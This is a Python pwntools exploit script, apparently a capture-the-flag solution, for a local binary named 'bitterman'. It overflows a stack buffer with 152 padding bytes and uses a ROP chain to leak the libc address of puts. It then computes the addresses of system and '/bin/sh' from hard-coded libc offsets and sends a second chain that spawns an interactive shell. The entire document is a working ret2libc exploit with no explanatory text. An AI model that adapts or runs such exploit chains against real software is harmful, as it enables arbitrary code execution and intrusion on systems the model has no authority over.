from pwn import *

context(terminal=['tmux','new-window'])

p = process('./bitterman')

#p = gdb.debug("./bitterman", "b main")

context(os = "linux", arch = "amd64")

#context.log_level = "DEBUG"

"""
	Stage 1 :: Leak
"""

plt_main = p64(0x4006ec)
plt_put = p64(0x400520)
got_put = p64(0x600c50)
pop_rdi = p64(0x400853)

junk = "A"*152

payload = junk + pop_rdi + got_put + plt_put + plt_main

p.recvuntil("name?")
p.sendline("Stormworm")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload) 
#raw_input()
p.recvuntil("Thanks!")
leaked_puts = p.recv()[:8].strip().ljust(8,"\x00")
log.success("Leaked puts@GLIBCL : " + str(leaked_puts))
leaked_puts = u64(leaked_puts)
"""
	Stage 2
"""
pop_rdi = p64(0x400853)
libc_put = 0x705e0
libc_sys = 0x435d0
libc_sh = 0x17f573


offset = leaked_puts - libc_put
sys = p64(offset + libc_sys)
sh = p64(offset + libc_sh)
payload = junk + pop_rdi + sh + sys

p.sendline("Stormworm")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload) 

p.interactive()